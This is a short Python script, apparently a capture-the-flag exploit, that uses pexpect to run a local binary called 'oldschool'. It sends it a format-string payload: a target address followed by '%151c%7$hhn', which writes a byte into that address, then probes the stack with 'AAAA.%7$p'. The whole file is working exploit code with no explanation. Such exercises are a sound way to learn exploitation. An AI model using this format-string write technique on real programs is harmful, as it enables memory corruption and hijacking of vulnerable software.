import pexpect
def main():
	try:
		child = pexpect.spawn('./oldschool')
		child.sendline('\xdc\x96\x04\x08%151c%7$hhn')
		child.expect('YOUR INPUT :')
		print(child.before)
		child.sendline('AAAA.%7$p')
		print(child.before)
		child.expect('YOUR INPUT :')
	except Exception as e:
		print(e)
		
	pass
main()
